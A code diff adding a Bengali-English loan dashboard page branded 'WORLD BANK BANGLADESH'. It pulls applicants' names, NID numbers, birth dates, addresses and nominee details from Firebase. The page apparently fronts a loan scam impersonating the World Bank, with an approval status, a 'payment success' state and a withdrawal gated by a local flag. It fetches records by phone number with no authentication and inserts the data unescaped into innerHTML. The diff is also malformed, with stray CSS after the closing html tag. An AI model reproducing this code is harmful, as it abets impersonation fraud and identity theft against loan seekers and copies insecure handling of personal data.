@@ -118,6 +118,667 @@ font-size:13px;
 font-weight:bold;
 }
 
+/* PREMIUM PROFILE & LOAN CARD */
+
+.profilebox{
+
+background:
+linear-gradient(
+135deg,
+#0f172a,
+#1e3a8a,
+#2563eb
+);
+
+padding:20px;
+
+border-radius:24px;
+
+line-height:34px;
+
+font-size:14px;
+
+box-shadow:
+0 10px 25px rgba(37,99,235,.20);
+
+border:
+1px solid rgba(255,255,255,.12);
+
+position:relative;
+
+overflow:hidden;
+
+margin-top:15px;
+
+color:white;
+}
+
+/* GLOW EFFECT */
+
+.profilebox::before{
+
+content:"";
+
+position:absolute;
+
+top:-40px;
+right:-40px;
+
+width:120px;
+height:120px;
+
+background:
+rgba(255,255,255,.10);
+
+border-radius:50%;
+
+filter:blur(10px);
+}
+
+/* TEXT */
+
+.profilebox b{
+
+color:#ffffff;
+
+font-size:15px;
+
+font-weight:800;
+}
+
+/* PREMIUM CARD EFFECT */
+
+.loanCard{
+
+background:
+rgba(255,255,255,.10);
+
+padding:14px;
+
+border-radius:16px;
+
+margin-top:10px;
+
+backdrop-filter:blur(6px);
+
+border:
+1px solid rgba(255,255,255,.08);
+}
+
+/* MOBILE */
+
+@media(max-width:768px){
+
+.profilebox{
+
+padding:18px;
+
+font-size:13px;
+
+line-height:32px;
+}
+
+.profilebox b{
+
+font-size:14px;
+}
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="topbar">
+
+<div>
+
+🌐 WORLD BANK BANGLADESH
+
+</div>
+
+<div id="topUsername">
+
+👤 USER
+
+</div>
+
+</div>
+
+<div class="menu">
+
+<div onclick="showProfile()">
+
+👤 Profile
+
+</div>
+
+<div onclick="showLoan()">
+
+📋 Loan
+
+</div>
+
+<div onclick="showHome()">
+
+🏠 Home
+
+</div>
+
+<div onclick="showHelp()">
+
+💬 Help
+
+</div>
+
+</div>
+
+<div class="container">
+
+<!-- HOME -->
+
+<div id="homePage">
+
+<div class="card">
+
+<div class="flex">
+
+<div class="left">
+
+<div class="loantext">
+
+Approved Amount
+
+</div>
+
+<div
+class="amount"
+id="loanAmountDisplay">
+
+৳0
+
+</div>
+
+<button class="button" onclick="openWithdraw()">
+
+উত্তলোন
+
+</button>
+
+</div>
+
+<div class="right">
+
+<div class="slider">
+
+<img
+id="sliderImage"
+src="https://images.unsplash.com/photo-1520607162513-77705c0f0d4a?q=80&w=1200&auto=format&fit=crop">
+
+</div>
+
+</div>
+
+</div>
+
+<div
+class="notice"
+id="statusNotice">
+
+আপনার লোনটি বর্তমানে পর্যালোচনাধীন রয়েছে।
+
+</div>
+
+<div class="flash">
+
+<marquee>
+
+🌐 WORLD BANK BANGLADESH এ আপনাকে স্বাগতম |
+আবেদন যাচাই কার্যক্রম চলছে |
+Customer Support Available
+
+</marquee>
+
+</div>
+
+</div>
+
+<div
+class="profilebox"
+id="profileDetails">
+
+Loading...
+
+</div>
+
+</div>
+
+<!-- LOAN PAGE -->
+
+<div
+id="loanPage"
+style="display:none;">
+
+<div
+class="profilebox"
+id="loanDetails">
+
+Loading...
+
+</div>
+
+</div>
+
+<!-- PROFILE PAGE -->
+
+<div
+id="profilePage"
+style="display:none;">
+
+<div
+class="profilebox"
+id="fullProfile">
+
+Loading...
+
+</div>
+
+</div>
+
+</div>
+
+<script type="module">
+
+import { initializeApp }
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+
+getFirestore,
+doc,
+getDoc
+
+}
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyDoviQemxQYk-nel7Zc8cAzZhWJvxzbMcc",
+
+authDomain: "loan-a87af.firebaseapp.com",
+
+projectId: "loan-a87af",
+
+storageBucket: "loan-a87af.firebasestorage.app",
+
+messagingSenderId: "661290569837",
+
+appId: "1:661290569837:web:0f03ecdfde2da0867def64"
+
+};
+
+const app =
+initializeApp(firebaseConfig);
+
+const db =
+getFirestore(app);
+
+/* MENU */
+
+function hideAll(){
+
+document.getElementById("homePage").style.display =
+"none";
+
+document.getElementById("loanPage").style.display =
+"none";
+
+document.getElementById("profilePage").style.display =
+"none";
+
+}
+
+window.showHome = function(){
+
+hideAll();
+
+document.getElementById("homePage").style.display =
+"block";
+
+}
+
+window.showLoan = function(){
+
+hideAll();
+
+document.getElementById("loanPage").style.display =
+"block";
+
+}
+
+window.showProfile = function(){
+
+hideAll();
+
+document.getElementById("profilePage").style.display =
+"block";
+
+}
+
+window.showHelp = function(){
+
+alert("Customer Service এর সাথে যোগাযোগ করুন");
+
+}
+
+/* WITHDRAW */
+
+window.openWithdraw = function(){
+
+let status =
+localStorage.getItem("withdrawStatus");
+
+if(status === "approved"){
+
+window.location.href =
+"withdraw.html";
+
+}else{
+
+alert(
+"আপনার উত্তোলন এখনো Approve করা হয়নি"
+);
+
+}
+
+}
+
+/* LOGIN CHECK */
+
+if(!localStorage.getItem("userMobile")){
+
+window.location.href =
+"login.html";
+
+}
+
+/* LOAD USER */
+
+async function loadUser(){
+
+let mobile =
+localStorage.getItem("userMobile");
+
+const snap =
+await getDoc(doc(db,"users",mobile));
+
+if(snap.exists()){
+
+let data =
+snap.data();
+
+/* TOP NAME */
+
+document.getElementById("topUsername")
+
+.innerHTML =
+
+"👤 " + (data.name || "USER");
+
+/* SMALL PROFILE */
+
+document.getElementById("profileDetails")
+
+.innerHTML =
+
+"<b>👤 নাম:</b> " + (data.name || "") +
+
+"<br><b>📱 মোবাইল:</b> " + (data.mobile || "") +
+
+"<br><b>🏠 ঠিকানা:</b> " + (data.currentAddress || "") +
+
+"<br><b>📅 Application Date:</b> " +
+
+new Date().toLocaleDateString();
+
+/* FULL PROFILE */
+
+document.getElementById("fullProfile")
+
+.innerHTML =
+
+"<div class='loanCard'><b>👤 Name / নাম:</b><br>" + (data.name || "") + "</div>" +
+
+"<div class='loanCard'><b>📱 Mobile / মোবাইল:</b><br>" + (data.mobile || "") + "</div>" +
+
+"<div class='loanCard'><b>🪪 NID Number / এনআইডি নম্বর:</b><br>" + (data.nid || "") + "</div>" +
+
+"<div class='loanCard'><b>🎂 Date of Birth / জন্ম তারিখ:</b><br>" + (data.dob || "") + "</div>" +
+
+"<div class='loanCard'><b>🏠 Current Address / বর্তমান ঠিকানা:</b><br>" + (data.currentAddress || "") + "</div>" +
+
+"<div class='loanCard'><b>🏡 Permanent Address / স্থায়ী ঠিকানা:</b><br>" + (data.permanentAddress || "") + "</div>" +
+
+"<div class='loanCard'><b>⚧ Gender / লিঙ্গ:</b><br>" + (data.sex || "") + "</div>" +
+
+"<div class='loanCard'><b>👥 Nominee Name / নমিনির নাম:</b><br>" + (data.nomineeName || "") + "</div>" +
+
+"<div class='loanCard'><b>🔗 Nominee Relation / সম্পর্ক:</b><br>" + (data.nomineeRelation || "") + "</div>" +
+
+"<div class='loanCard'><b>📞 Nominee Mobile / নমিনির মোবাইল:</b><br>" + (data.nomineeMobile || "") + "</div>";
+
+/* LOAN DETAILS */
+
+let amount =
+parseInt(data.loanAmount || 0);
+
+let interest =
+Math.round(amount * 0.024);
+
+let totalPay =
+amount + interest;
+
+document.getElementById("loanDetails")
+
+.innerHTML =
+
+"<div class='loanCard'><b>💰 Request Amount / আবেদনকৃত টাকা:</b><br>৳" + (data.loanAmount || "0") + "</div>" +
+
+"<div class='loanCard'><b>✅ Approved Amount / অনুমোদিত টাকা:</b><br>৳" + (data.approvedAmount || "0") + "</div>" +
+
+"<div class='loanCard'><b>📈 Interest Rate / সুদের হার:</b><br>2.4%</div>" +
+
+"<div class='loanCard'><b>📆 Installment / কিস্তি:</b><br>" + (data.loanDuration || "") + " Month</div>" +
+
+"<div class='loanCard'><b>💵 Total Interest / মোট সুদ:</b><br>৳" + interest + "</div>" +
+
+"<div class='loanCard'><b>💳 Total Repayment / মোট পরিশোধ:</b><br>৳" + totalPay + "</div>" +
+
+"<div class='loanCard'><b>📌 Loan Status / স্ট্যাটাস:</b><br>" + (data.status || "pending") + "</div>";
+
+/* APPROVED AMOUNT */
+
+document.getElementById("loanAmountDisplay")
+
+.innerHTML =
+
+"৳" + (data.approvedAmount || "0");
+
+/* STATUS */
+
+let status =
+data.status || "pending";
+
+if(status=="pending"){
+
+document.getElementById("statusNotice")
+
+.innerHTML =
+
+"আপনার লোনটি বর্তমানে পর্যালোচনাধীন রয়েছে।";
+
+}
+
+if(status=="approved"){
+
+document.getElementById("statusNotice")
+
+.innerHTML =
+
+"আপনার লোনটি সফলভাবে Verify Complete হয়েছে।";
+
+}
+
+if(status=="rejected"){
+
+document.getElementById("statusNotice")
+
+.innerHTML =
+
+"দুঃখিত, আপনার লোন আবেদনটি বাতিল করা হয়েছে।";
+
+}
+
+if(status=="payment success"){
+
+document.getElementById("statusNotice")
+
+.innerHTML =
+
+"আপনার Payment সফলভাবে জমা হয়েছে।";
+
+}
+
+}
+
+}
+
+loadUser();
+
+/* FIXED SLIDER */
+
+const sliderImages = [
+
+"https://images.unsplash.com/photo-1520607162513-77705c0f0d4a?q=80&w=1200&auto=format&fit=crop",
+
+"https://images.unsplash.com/photo-1554224155-6726b3ff858f?q=80&w=1200&auto=format&fit=crop",
+
+"https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?q=80&w=1200&auto=format&fit=crop",
+
+"https://images.unsplash.com/photo-1563013544-824ae1b704d3?q=80&w=1200&auto=format&fit=crop"
+
+];
+
+let currentSlide = 0;
+
+setInterval(function(){
+
+currentSlide++;
+
+if(currentSlide >= sliderImages.length){
+
+currentSlide = 0;
+
+}
+
+document.getElementById("sliderImage").src =
+
+sliderImages[currentSlide];
+
+},3000);
+
+</script>
+
+</body>
+
+</html>
+.menu div{
+background:#f8fafc;
+padding:8px 12px;
+border-radius:12px;
+font-size:12px;
+font-weight:bold;
+cursor:pointer;
+}
+
+.container{
+padding:12px;
+}
+
+.card{
+background:white;
+border-radius:20px;
+padding:16px;
+box-shadow:0 0 12px rgba(0,0,0,0.08);
+}
+
+.flex{
+display:flex;
+gap:10px;
+align-items:center;
+}
+
+.left,.right{
+flex:1;
+}
+
+.loantext{
+font-size:15px;
+font-weight:bold;
+}
+
+.amount{
+font-size:38px;
+font-weight:bold;
+color:#0047d4;
+margin:10px 0;
+}
+
+.button{
+width:100%;
+background:#0047d4;
+color:white;
+border:none;
+padding:12px;
+border-radius:14px;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+}
+
+.slider img{
+width:100%;
+height:150px;
+object-fit:cover;
+border-radius:16px;
+transition:0.5s;
+}
+
+.notice{
+margin-top:15px;
+background:#09c63c;
+color:white;
+padding:12px;
+border-radius:14px;
+font-size:13px;
+font-weight:bold;
+text-align:center;
+}
+
+.flash{
+margin-top:15px;
+background:#0047d4;
+color:white;
+padding:10px;
+border-radius:12px;
+font-size:13px;
+font-weight:bold;
+}
+
 .profilebox{
 margin-top:15px;
 padding:18px;
